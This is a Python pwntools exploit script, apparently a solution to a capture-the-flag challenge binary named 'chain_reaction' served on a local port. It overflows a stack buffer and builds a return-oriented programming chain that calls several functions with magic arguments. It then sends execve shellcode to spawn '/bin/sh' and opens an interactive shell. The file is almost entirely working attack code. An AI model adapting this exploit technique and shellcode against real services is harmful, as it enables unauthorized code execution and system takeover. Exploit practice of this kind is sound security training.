from pwn import *

# Init context
# process_object = process("./chain_reaction")
process_object = remote("127.0.0.1", 10001)
elf_object = ELF("./chain_reaction")

# Extract gadget
rop_object = ROP("./chain_reaction")
pop_rdi = p64(rop_object.find_gadget(['pop rdi', 'ret'])[0])
pop_rsi_r15 = p64(rop_object.find_gadget(['pop rsi', 'pop r15' , 'ret'])[0])
ret = p64(rop_object.find_gadget(['ret'])[0])

payload = b'A' * 0x48  # Correct buffer size

# Call chain_1
payload += pop_rdi
payload += p64(0xdeadbeef)

payload += p64(elf_object.symbols["chain_1"])

# Call chain_2
payload += pop_rdi
payload += p64(0xcafebabe)
payload += pop_rsi_r15
payload += p64(0xdeadc0de)
payload += p64(0x0)  
payload += p64(elf_object.symbols["chain_2"])
payload += p64(elf_object.symbols["last_chance"])

print(process_object.recv())
process_object.sendline(payload)

print(process_object.recv())

# shellcode = b"\x90\x90\x31\xc0\x31\xd2\x48\xc7\x44\x24\xe0\x4b\x68\x66\x74\x48\xc7\x44\x24\xe4\x1d\x0b\x65\x60\x48\x81\x74\x24\xe0\x64\x0a\x0f\x1a\x48\x81\x74\x24\xe4\x32\x24\x16\x08\x48\x8d\x7c\x24\xe0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"


shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

process_object.sendline(shellcode)
process_object.interactive()


